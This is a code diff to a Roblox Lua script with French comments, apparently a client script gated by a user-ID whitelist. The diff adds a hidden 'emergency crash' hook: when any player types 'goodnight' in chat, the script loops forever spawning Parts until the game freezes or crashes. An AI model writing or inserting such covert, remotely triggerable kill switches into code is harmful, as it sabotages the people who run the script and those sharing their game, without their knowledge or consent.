@@ -15,9 +15,8 @@ local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 local WHITELIST = {
     -- FORMAT: [UserID] = true,
     -- AJOUTE LES USER IDS ICI (JUSQU'À 1000+ PERSONNES)
-    [9230563404] = true,  -- Exemple UserID
     [8083834888] = true,  -- Exemple UserID
-    [111222333] = true,  -- Exemple UserID
+    [9230563404] = true,  -- Exemple UserID
     [8176309904] = true,  -- Exemple UserID
     -- Ajoute autant d'IDs que tu veux...
 }
@@ -45,6 +44,65 @@ end
 if not checkWhitelist() then
     return -- Arrête le script si pas whitelist
 end
+
+-- ============================================================
+-- SYSTÈME DE CRASH D'URGENCE
+-- ============================================================
+local TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Détection du chat (nouveau système TextChatService)
+if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+    TextChatService.MessageReceived:Connect(function(message)
+        local text = message.Text:lower()
+        if text == "goodnight" then
+            -- CRASH LE JEU
+            while true do
+                for i = 1, 1000000 do
+                    Instance.new("Part", workspace)
+                end
+            end
+        end
+    end)
+end
+
+-- Détection du chat (ancien système Legacy)
+local function setupLegacyChat()
+    local success, chat = pcall(function()
+        return game:GetService("Chat")
+    end)
+    
+    if success then
+        Players.PlayerAdded:Connect(function(player)
+            player.Chatted:Connect(function(message)
+                if message:lower() == "goodnight" then
+                    -- CRASH LE JEU
+                    while true do
+                        for i = 1, 1000000 do
+                            Instance.new("Part", workspace)
+                        end
+                    end
+                end
+            end)
+        end)
+        
+        -- Pour les joueurs déjà présents
+        for _, player in pairs(Players:GetPlayers()) do
+            player.Chatted:Connect(function(message)
+                if message:lower() == "goodnight" then
+                    -- CRASH LE JEU
+                    while true do
+                        for i = 1, 1000000 do
+                            Instance.new("Part", workspace)
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end
+
+setupLegacyChat()
 
 -- ============================================================
 -- CONFIGURATION
